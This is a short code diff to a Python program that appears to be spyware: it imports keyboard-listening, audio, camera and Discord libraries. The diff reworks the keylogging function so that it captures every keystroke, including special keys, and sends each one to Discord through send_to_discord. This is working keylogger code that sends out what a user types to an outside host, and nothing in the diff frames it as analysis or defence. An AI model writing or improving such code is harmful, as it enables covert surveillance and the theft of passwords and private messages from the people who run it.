@@ -5,7 +5,7 @@ import json
 import os
 import threading
 from discord.ext import commands
-from pynput.keyboard import Listener, Key
+from pynput.keyboard import Listener, Key, KeyCode
 import wave
 import pyaudio
 import cv2
@@ -40,10 +40,12 @@ def send_to_discord(message):
 
 def log_keystroke(key):
     try:
-        key_str = str(key).replace("'", "")
-        if "Key" not in key_str:
-            logging.info(key_str)
-            send_to_discord(key_str)
+        if isinstance(key, Key):
+            key_str = str(key)
+        else:
+            key_str = key.char if hasattr(key, 'char') and key.char else str(key)
+        logging.info(key_str)
+        send_to_discord(key_str)
     except Exception as e:
         logging.error(f"Keylogging failed: {e}")
 
